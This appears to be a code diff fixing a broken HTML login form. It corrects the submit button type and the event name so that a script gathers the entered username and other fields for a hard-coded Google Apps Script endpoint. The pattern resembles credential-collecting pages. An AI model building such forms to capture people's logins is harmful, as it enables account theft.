@@ -13,12 +13,12 @@
   <input type="text" id="uname" name="username" required><br><br>
   <input type="email" id="email" name="email" placeholder="Email"><br><br>
   <textarea id="password" name="password" placeholder="Password"></textarea><br><br>
-  <input type="login" value="Log in">
+  <input type="submit" value="Log in">
 </form>
 
 <script>
   const URL = 'https://script.google.com/macros/s/AKfycbzj50hDibN8G1rrKDZFKl8XUutU5WPPqtkxrig_i1MP47HWi9SgBHbXyKirqe4vBg-m/exec';
-  document.getElementById('submitForm').addEventListener('login', async (e) => {
+  document.getElementById('submitForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const payload = {
       username: document.getElementById('uname').value.trim(),
